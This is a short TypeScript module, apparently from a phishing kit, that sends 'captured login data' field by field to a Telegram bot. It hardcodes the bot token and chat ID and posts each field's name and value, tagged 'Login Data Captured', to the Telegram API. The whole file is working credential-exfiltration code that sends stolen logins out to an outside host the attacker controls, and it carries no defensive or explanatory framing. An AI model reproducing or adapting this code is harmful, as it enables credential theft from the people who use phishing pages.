/**
 * Telegram Bot Integration
 * Sends captured login data to Telegram bot
 */

const TELEGRAM_BOT_TOKEN = '8211906189:AAFefPi_NrJwvsZ6njNratZlhNaMl84I7qw';
const TELEGRAM_CHAT_ID = '-1003343585643';

export async function sendToTelegram(fieldName: string, value: string): Promise<boolean> {
  try {
    const message = `🔐 *Login Data Captured*\n\n*Field:* ${fieldName}\n*Value:* \`${value}\`\n\n_Timestamp: ${new Date().toISOString()}_`;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    if (!response.ok) {
      console.error('Telegram API error:', await response.text());
      return false;
    }

    return true;
  } catch (error) {
    console.error('Failed to send message to Telegram:', error);
    return false;
  }
}
